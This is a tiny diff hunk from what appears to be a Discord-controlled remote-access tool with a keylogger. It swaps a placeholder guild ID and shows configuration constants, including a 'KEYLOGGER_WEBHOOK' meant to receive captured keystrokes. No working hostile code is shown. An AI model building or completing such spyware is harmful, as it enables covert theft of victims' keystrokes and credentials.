@@ -40,7 +40,7 @@ from libraries import layn
 
 
 
-GUILD = discord.Object(id = "ID CANAL")
+GUILD = discord.Object(id = "ID GRUPO")
 CHANNEL = ID CANAL
 KEYLOGGER_WEBHOOK = "WEBHOOK DISCORD"
 CURRENT_AGENT = 0
